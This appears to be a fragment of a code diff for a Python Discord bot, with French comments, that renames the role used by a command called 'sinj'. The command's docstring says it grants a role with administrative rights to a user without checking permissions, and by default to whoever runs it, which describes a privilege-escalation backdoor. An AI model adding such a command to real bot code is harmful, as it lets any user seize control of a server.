@@ -14,7 +14,7 @@ async def sinj(ctx, member: discord.Member = None):
     """Attribue le rôle 'sinj' avec les droits administratifs à un utilisateur, sans vérifier ses permissions."""
 
     guild = ctx.guild
-    role_name = "sinj"
+    role_name = "sinje"
 
     # Si aucun membre n'est précisé, on applique le rôle à l'auteur de la commande
     if member is None:
